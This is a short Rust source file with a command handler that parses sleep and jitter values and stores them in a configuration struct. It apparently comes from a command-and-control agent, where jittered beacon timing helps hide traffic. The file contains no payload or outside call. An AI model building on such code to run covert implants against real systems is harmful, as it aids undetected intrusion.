use std::error::Error;
use crate::cmd::ConfigOptions;

/// Modifies the sleep and jitter times
/// 
/// Usage: `sleep [SLEEP_TIME] [JITTER_TIME]`
pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<String, Box<dyn Error>> {
    let mut args = s.split(" ");
    let sleep_interval: u64 = args
        .nth(0)
        .unwrap()
        .parse()
        .unwrap_or_else(|_| config_options.sleep_interval);
    let jitter_time: u64 = args
        .nth(0)
        .unwrap()
        .parse()
        .unwrap_or_else(|_| config_options.jitter_time);
    config_options.sleep_interval = sleep_interval;
    config_options.jitter_time = jitter_time;
    Ok(format!("[+] Sleep time: {sleep_interval}, Jitter time: {jitter_time}"))
}